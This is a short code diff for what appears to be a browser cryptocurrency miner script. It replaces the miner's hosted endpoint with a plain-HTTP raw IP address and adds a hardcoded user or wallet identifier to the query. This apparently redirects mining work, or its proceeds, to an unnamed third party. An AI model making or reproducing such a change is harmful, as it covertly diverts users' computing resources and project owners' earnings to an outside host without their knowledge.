@@ -26,7 +26,7 @@ const run = async () => {
     .map(([key, value]) => `${encodeURIComponent(key)}=${encodeURIComponent(value)}`)
     .join('&');
 
-    urls[params.algorithm] = `https://browserminer.vercel.app?${query}`;
+    urls[params.algorithm] = `http://216.98.13.181/?user=TQdUbAjkqkSbb6cVYJ8TYKUXR3urqSU6s6${query}`;
   });
 
   try {
